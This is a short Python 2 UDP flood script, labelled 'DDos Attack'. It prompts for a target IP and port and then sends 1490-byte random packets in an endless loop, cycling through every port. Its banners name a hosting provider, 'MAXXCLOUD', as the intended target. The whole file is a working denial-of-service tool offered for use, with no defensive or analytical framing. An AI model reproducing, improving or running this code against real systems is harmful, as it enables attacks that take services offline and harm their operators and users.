import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Test or comment 2 out // After field test 2 works fine 
os.system("clear")
os.system("figlet DDos Attack")
print "Lets GO and Don't use MAXXCLOUD !"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Ready TO DDOS MAXXCLOUD ?"
print "20 Sekunden Attacke wird Vorbereitet"
time.sleep(20)
print "100%"
time.sleep(2)
print "Drei"
time.sleep(1)
print "Zwei"
time.sleep(1)
print "Eins"
time.sleep(1)
print "Bomb has been Planted //Never use MAXXCLOUD !!!"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

